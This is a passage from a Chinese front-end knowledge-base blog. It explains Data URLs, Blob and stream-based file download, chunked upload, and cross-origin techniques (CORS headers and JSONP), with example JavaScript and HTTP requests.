<h3 id="DataURL"><a href="#DataURL" class="headerlink" title="DataURL"></a>DataURL</h3><p>Data URLs 由四个部分组成：前缀(data:)、指示数据类型的 MIME 类型、如果非文本则为可选的 base64 标记、数据本身：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>:,<span class="title class_">Hello</span>%2C%20World! <span class="comment">// hello World!</span></span><br><span class="line"><span class="attr">data</span>:text/plain;base64,<span class="title class_">SGVsbG</span>8sIFdvcmxkIQ%3D%3D <span class="comment">// 上面的base64编码版本</span></span><br><span class="line"><span class="attr">data</span>:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E <span class="comment">// &lt;h1&gt;Hello, World&lt;/h1&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>长度限制</strong><br>虽然 Firefox 支持无限长度的 data URLs，但是标准中并没有规定浏览器必须支持任意长度的 data URIs。比如，Opera 11 浏览器限制 URLs 最长为 65535 个字符，这意味着 data URLs 最长为 65529 个字符（如果你使用纯文本 data:, 而不是指定一个 MIME 类型的话，那么 65529 字符长度是编码后的长度，而不是源文件）<br>​</p>
<p><strong>缺乏错误处理</strong><br>MIME 类型错误或者 base64 编码错误,都会造成 data URIs 无法被正常解析, 但不会有任何相关错误提示.</p>
<p><strong>不支持查询字符串</strong><br>一个 data URI 的数据字段是没有结束标记的,所以尝试在一个 data URI 后面添加查询字符串会导致,查询字符串也一并被当作数据字段<br>​</p>
<h4 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DataURL转化为blob</span></span><br><span class="line"><span class="keyword">const</span> str1 = <span class="string">&quot;data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> str2 =</span><br><span class="line">  <span class="string">&quot;data:text/html;base64,JTNDaDElM0VIZWxsbyUyQyUyMFdvcmxkISUzQyUyRmgxJTNF&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">dataUrltoBlob</span> = (<span class="params">dataURL</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [head, data] = dataURL.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> isBase64 = head.<span class="title function_">includes</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">MIME</span> = head.<span class="title function_">match</span>(isBase64 ? <span class="regexp">/:(.*)(?=;base64)/</span> : <span class="regexp">/:(.*)/</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Blob</span>(</span><br><span class="line">    [</span><br><span class="line">      <span class="comment">// 如果是base64编码，要用window.atob()解码 编码方法为window.btoa()</span></span><br><span class="line">      isBase64 ? <span class="variable language_">window</span>.<span class="title function_">atob</span>(data) : data,</span><br><span class="line">    ],</span><br><span class="line">    &#123; <span class="attr">type</span>: <span class="variable constant_">MIME</span> &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> blob1 = <span class="title function_">dataUrltoBlob</span>(str1);</span><br><span class="line"><span class="keyword">const</span> blob2 = <span class="title function_">dataUrltoBlob</span>(str2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取blob为DataURL</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">blobtoDataUrl</span> = <span class="keyword">async</span> (<span class="params">blob, isBase64 = <span class="literal">true</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    reader.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (isBase64) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(reader.<span class="property">result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> [head, data] = reader.<span class="property">result</span>.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">MIME</span> = head.<span class="title function_">match</span>(<span class="regexp">/:(.*)(?=;base64)/</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">`data:<span class="subst">$&#123;MIME&#125;</span>,<span class="subst">$&#123;<span class="variable language_">window</span>.atob(data)&#125;</span>`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    reader.<span class="title function_">readAsDataURL</span>(blob);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line">str1 === (<span class="keyword">await</span> <span class="title function_">blobtoDataUrl</span>(blob1, <span class="literal">false</span>));</span><br><span class="line">str2 === (<span class="keyword">await</span> <span class="title function_">blobtoDataUrl</span>(blob2, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure>

<h2 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h2><p>Streams API 允许 JavaScript 以编程的方式访问通过网络接收的数据流，流将你希望通过网络接收的资源拆分成小块，然后按位处理它。<br>例如，一个成功的 fetch request 响应 Body 会暴露为 ReadableStream，之后你就可以使用 ReadableStream.getReader() 建立的 reader 读取它，使用 ReadableStream.cancel() 取消它。<br>​</p>
<h3 id="ReadableStream"><a href="#ReadableStream" class="headerlink" title="ReadableStream"></a>ReadableStream</h3><p>ReadableStream() 构造器创建并返回包含处理函数的可读流实例.<br>​</p>
<h3 id="WritableStream"><a href="#WritableStream" class="headerlink" title="WritableStream"></a>WritableStream</h3><p>待补充<br>​</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><code>URL.createObjectURL(blob)</code> 会产生一个类似 blob:d3958f5c-0777-0845-9dcf-2cb28783acaf 这样的 URL 字符串，指向 blob 对象，可以像使用普通 URL 那样使用它，比如用在 img.src 上。<br><code>URL.revokeObjectURL(url)</code> 用来释放一个之前通过调用 URL.createObjectURL() 创建的已经存在的 URL 对象。当你结束使用某个 URL 对象时，应该通过调用这个方法来让浏览器知道不再需要保持这个文件的引用了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取数据流</span></span><br><span class="line"><span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">ReadableStream</span>().<span class="title function_">getReader</span>();</span><br><span class="line"><span class="keyword">let</span> file = [];</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">process</span> = (<span class="params">&#123; done, value &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (done) &#123;</span><br><span class="line">    <span class="comment">// 将数组数据转化为blob格式</span></span><br><span class="line">    <span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(file)], &#123; <span class="attr">type</span>: <span class="string">&quot;text/csv&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    a.<span class="property">download</span> = <span class="string">`file_name.csv`</span>;</span><br><span class="line">    <span class="comment">// 根据Blob/File/MediaSource对象生成url，也可以生成DataURL，但是可能会过长</span></span><br><span class="line">    <span class="keyword">const</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line">    a.<span class="property">href</span> = url;</span><br><span class="line">    <span class="comment">// a = &lt;a href=&quot;url&quot; download=&quot;file_name.csv&quot; /&gt;</span></span><br><span class="line">    a.<span class="title function_">click</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果后端接口返回file，可以用window.location.href = `?param1=1&amp;param2=2`</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 未结束循环读取数据，将数据拼接到file数组中</span></span><br><span class="line">    value &amp;&amp; file.<span class="title function_">push</span>(...<span class="title class_">Array</span>.<span class="title function_">from</span>(value));</span><br><span class="line">    reader.<span class="title function_">read</span>().<span class="title function_">then</span>(process);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">reader.<span class="title function_">read</span>().<span class="title function_">then</span>(process);</span><br></pre></td></tr></table></figure>

<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>将文件处理成 blob 格式，通过 slice 进行分片，分片的同时还需要标记每片的顺序。上传时先计算哈希值，验证文件是否存在，并且与服务器进行适当约定合并时机。<br><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1631958991950-ac1b95c3-3ea8-4e90-b917-bef1c256839e.webp#clientId=ua3cdcb1c-6f49-4&from=paste&id=uab375987&margin=%5Bobject%20Object%5D&originHeight=1020&originWidth=1264&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u042354f3-02a2-45f5-b6be-f66063f700a"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob">https://developer.mozilla.org/zh-CN/docs/Web/API/Blob</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types.">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types.</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/File">https://developer.mozilla.org/zh-CN/docs/Web/API/File</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob/arrayBuffer">https://developer.mozilla.org/zh-CN/docs/Web/API/Blob/arrayBuffer</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Streams_API">https://developer.mozilla.org/zh-CN/docs/Web/API/Streams_API</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6980142557066067982">https://juejin.cn/post/6980142557066067982</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/09/14/%E8%B7%A8%E5%9F%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/14/%E8%B7%A8%E5%9F%9F/" class="post-title-link" itemprop="url">跨域</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-14 14:27:12" itemprop="dateCreated datePublished" datetime="2021-09-14T14:27:12+08:00">2021-09-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:04" itemprop="dateModified" datetime="2022-02-14T19:41:04+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>指域名、协议、端口相同</p>
<h3 id="为什么要有同源策略"><a href="#为什么要有同源策略" class="headerlink" title="为什么要有同源策略"></a>为什么要有同源策略</h3><p>DOM 同源限制（不同域的 iframe 之间可以通信）：假网站用 iframe 嵌套支付网站，并且 iframe 覆盖整个页面。假如没有 DOM 同源限制，假网站可以直接读取支付网站表单的 dom，获取密码<br>XML 同源，防止 CSRF 攻击：登录支付网站，访问假网站，假网站向支付网站后台发起跨域请求，请求自动带上了之前登录的 cookie，伪造了身份<br>存储性内容同源限制（Cookie，Localstorage，IndexedDB）<br>​</p>
<p>​</p>
<p>跨域<strong>fetch</strong>会发送 2 次请求，第一次为预检<strong>Preflighted。</strong>带预检(Preflighted)的跨域请求需要浏览器在发送真实 HTTP 请求之前先发送一个 OPTIONS 的预检请求，检测服务器端是否支持真实请求进行跨域资源访问，真实请求的信息在 OPTIONS 请求中通过 Access-Control-Request-Method Header 和 Access-Control-Request-Headers Header 描述</p>
<h2 id="请求跨域"><a href="#请求跨域" class="headerlink" title="请求跨域"></a>请求跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>跨域资源共享（Cross-origin resource sharing）允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制。<br>CORS 是一个 W3C 标准，需要浏览器和服务器同时支持。整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求 OPTIONS 请求，用于校验该次请求是否被服务器允许，但用户不会有感觉。<br>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。<br>浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。<br>只要同时满足以下两大条件，就属于<strong>简单请求</strong>。</p>
<ol>
<li>请求方法是以下三种方法之一：</li>
</ol>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<ol start="2">
<li>HTTP 的头信息不超出以下几种字段：</li>
</ol>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。<br>​</p>
<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><ol>
<li>在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：</li>
</ol>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span><span class="punctuation">: </span>FooBar</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。</li>
<li>如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 Access-Control-Allow-Credentials: true。</li>
</ol>
<p>​</p>
<ul>
<li>Access-Control-Allow-Origin</li>
</ul>
<p>该字段是必须的。它的值要么是请求时 Origin 字段的值，要么是一个<em>，表示接受任意域名的请求。（</em> 不支持 cookie 的 )</p>
<ul>
<li>Access-Control-Allow-Credentials</li>
</ul>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true，如果服务器不要浏览器发送 Cookie，删除该字段即可。(默认为 FALSE)</p>
<ul>
<li>Access-Control-Expose-Headers</li>
</ul>
<p>该字段可选。CORS 请求时，XMLHttpRequest 对象的 getResponseHeader()方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers 里面指定。上面的例子指定。<br>​</p>
<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>浏览器在发送真正的请求之前，会先发送一个 预检请求（Preflighted Request）给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p>
<ul>
<li>Origin：与简单的请求相同。</li>
<li>Access-Control-Request-Method: 请求自身使用的方法。</li>
<li>Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Request-Method</span><span class="punctuation">: </span>PUT</span><br><span class="line"><span class="attribute">Access-Control-Request-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>​</p>
<p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p>
<ul>
<li>Access-Control-Allow-Origin：与简单的请求相同。</li>
<li>Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</li>
<li>Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</li>
<li>Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.0.61 (Unix)</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Keep-Alive</span><span class="punctuation">: </span>timeout=2, max=100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
<p>​</p>
<p>​</p>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>由于 script 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</span></span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">getElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&quot;http://www.laixiangran.cn/json?callback=handleResponse&quot;</span>;</span><br><span class="line">body.<span class="title function_">appendChild</span>(script);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?callback=handleResponse`，</span></span><br><span class="line"><span class="comment">// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器</span></span><br><span class="line"><span class="comment">// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装</span></span><br><span class="line"><span class="comment">// index.html</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jsonp</span>(<span class="params">&#123; url, params, callback &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    <span class="variable language_">window</span>[callback] = <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(data);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(script);</span><br><span class="line">    &#125;;</span><br><span class="line">    params = &#123; ...params, callback &#125;; <span class="comment">// wd=b&amp;callback=show</span></span><br><span class="line">    <span class="keyword">let</span> arrs = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> params) &#123;</span><br><span class="line">      arrs.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;params[key]&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    script.<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;url&#125;</span>?<span class="subst">$&#123;arrs.join(<span class="string">&quot;&amp;&quot;</span>)&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;src&quot;</span>, script.<span class="property">src</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">jsonp</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/say&quot;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123; <span class="attr">wd</span>: <span class="string">&quot;Iloveyou&quot;</span> &#125;,</span><br><span class="line">  <span class="attr">callback</span>: <span class="string">&quot;show&quot;</span>,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>​</p>
<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
